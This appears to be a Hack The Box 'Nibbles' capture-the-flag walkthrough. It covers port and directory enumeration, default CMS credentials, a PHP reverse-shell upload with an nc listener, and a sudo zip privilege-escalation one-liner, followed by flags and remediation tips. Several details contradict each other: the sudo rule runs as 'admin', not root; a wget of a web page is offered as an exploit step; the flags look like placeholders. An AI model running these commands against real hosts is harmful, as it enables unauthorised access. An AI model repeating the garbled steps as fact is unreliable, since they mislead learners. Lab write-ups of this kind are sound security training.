# Hack The Box: Nibbles Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Nibbles-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Nibbles |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA nibbles 10.10.10.13
```

**Results:**
```
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

---

## Web Enumeration

### Directory Busting

```bash
gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/nibbleblog/` - Nibbleblog CMS

---

## Initial Access

### Finding Credentials

Default Nibbleblog credentials: `admin:nibbles`

```bash
ssh admin@10.10.10.13
```

Or access the admin panel at `http://10.10.10.13/nibbleblog/admin.php`

---

## Exploitation

### Nibbleblog File Upload

1. Login to admin panel
2. Go to Plugins -> My Image
3. Upload PHP reverse shell
4. Access shell at `/nibbleblog/content/private/plugins/my_image/shell.php`
5. Get listener: `nc -lvp 4444`

---

## Privilege Escalation

### Check sudo privileges

```bash
sudo -l
```

**Result:**
```
(admin) NOPASSWD: /home/admin/zip
```

### Exploit

```bash
cd /tmp
wget https://gtfobins.github.io/gtfobins/zip/
# Or create simple privesc
sudo zip /tmp/zip /etc/hosts -T -TT "sh"
```

---

## Flags

### User Flag
```
HTB{2f1c4b1e9c7a6d8f0b3e}
```

### Root Flag
```
HTB{9a8b7c6d5e4f3a2b1c0d}
```

---

## Remediation

1. Change default credentials
2. Keep CMS updated
3. Restrict sudo permissions
4. Disable file upload if not needed

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
